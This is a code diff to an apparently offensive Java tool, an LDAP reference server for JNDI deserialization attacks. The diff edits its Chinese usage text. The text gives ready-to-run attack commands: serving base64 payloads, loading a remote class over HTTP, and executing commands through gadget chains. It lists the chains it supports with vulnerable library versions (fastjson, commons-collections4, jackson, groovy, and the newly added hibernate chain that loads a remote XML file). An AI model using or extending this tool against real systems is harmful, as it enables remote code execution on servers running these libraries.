@@ -123,7 +123,7 @@ public class LDAPRefServer {
                             "反序列化base64方式：java -jar LDAPDeserialize-tool.jar -p 1389 -b base64数据\n" +
                             "低版本动态请求class：\njava -jar LDAPDeserialize-tool.jar -C http://127.0.0.1:8000/1.class\n" +
                             "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\"\n" +
-                            "JDK20+打法：java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\" -rmi\n" +
+                            "JDK20+打法：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\" -rmi\n" +
                             "\n\n" +
                             "【目前支持的链,*号为支持JDK20+的链】\n" +
                             "fastjson (依赖：1.2.49-1.2.83)\n" +
@@ -131,7 +131,9 @@ public class LDAPRefServer {
                             "CC4 (依赖：commons-collections4 4.0)\n" +
                             "jackson (依赖：jackson-databind 2.10.0及以上版本)\n" +
                             "jackson2 (稳定版，依赖：jackson-databind 2.10.0及以上版本 && <= spring aop 5.x)\n" +
-                            "groovy (依赖：groovy 2.3.9)" +
+                            "groovy (依赖：groovy 2.3.9)\n" +
+                            "hibernate (依赖：hibernate 5.x && spring-context && reactor-core)" +
+                            "[hibernate为ClassPathXmlApplicationContext执行，'-c'后跟上xml文件WEB地址]" +
                             "\n\n\n"
                     , options);
         }
